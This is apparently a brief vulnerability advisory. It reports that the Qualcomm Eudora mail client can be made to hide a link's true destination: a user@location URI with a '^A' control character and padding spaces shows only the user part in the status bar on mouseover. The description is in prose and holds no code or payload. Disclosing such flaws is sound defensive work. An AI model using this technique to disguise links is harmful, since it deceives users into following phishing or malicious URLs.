It has been reported that the Qualcomm Eudora MTA is prone to a URI obfuscation weakness that may hide the true contents of a link. The problem occurs when a user@location URI is formatted in such a way that a "^A" control character is located after the user value. The user value may then be appended with space characters to obfuscate status bar and mouseover details. It is said that, when doing a mouseover of such a URI, it will cause the status bar to only display the contents of the user value, not the entire link.
